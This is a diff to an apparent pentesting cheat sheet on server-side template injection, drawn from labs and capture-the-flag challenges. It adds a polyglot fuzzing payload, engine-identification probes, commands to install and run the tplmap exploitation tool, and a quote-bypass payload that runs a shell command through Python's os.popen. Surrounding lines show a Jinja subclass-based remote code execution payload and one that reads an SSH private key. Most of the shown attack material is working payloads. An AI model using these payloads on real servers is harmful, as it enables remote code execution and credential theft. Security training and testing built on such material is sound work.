@@ -33,6 +33,11 @@ engine.render("Hello {{"+greeting+"}}", data)
 http://vulnerable-website.com/?greeting=data.username}}<tag>
 ```
 
+>[!tip] Polyglot payload to fuzz'em all
+>`${{<%[%'"}}%\.` [^cobalt]
+
+[^cobalt]: [A Pentester's Guide to Server Side Template Injection (SSTI)](https://www.cobalt.io/blog/a-pentesters-guide-to-server-side-template-injection-ssti), cobalt.io
+
 ## Identify
 
 Once you have detected the template injection potential, the next step is to identify the template engine. Although there are a huge number of templating languages, many of them use very similar syntax.
@@ -41,6 +46,19 @@ Once you have detected the template injection potential, the next step is to ide
 
 ```
 ${'1'*1} {{'2'*2}} a{*foo*}b ${"z".join("ab")} <%= '3'*3 %> ${{'4'*4}} #{'5'*5} *{'6'*6}
+```
+
+>[!tip] Automate
+>You can also use [tplmap](https://github.com/epinna/tplmap) to automate the identification and exploitation of SSTI vulnerabilities
+
+```bash
+$ git clone https://github.com/epinna/tplmap.git
+$ cd tplmap
+$ pip install virtualenv
+$ virtualenv -p python2 venv
+$ source venv/bin/activate
+$ pip install -r requirements.txt
+$ ./tplmap.py -u 'http://vulnerable.com:8080' -d name=john
 ```
 
 ## Exploit
@@ -263,6 +281,11 @@ blog-post-author-display=user.setAvatar('/home/carlos/.ssh/id_rsa','image/jpg')}
 {{ subclasses_r }}
 {{ subclasses_r[420] }}
 {{ subclasses_r[420](["/usr/bin/touch","/tmp/das-ist-walter"]) }} # RCE!
+
+# No Quotes - from https://infosecwriteups.com/ssti-bypassing-single-quotes-filter-dc0ee4e4f011
+GET /{{url_for.__globals__.os.popen(request.headers.hack).read()}} HTTP/1.1
+hack: cat ../flag.txt
+Host: chal.pctf.competitivecyber.club:5555
 ```
 
 # External Resources
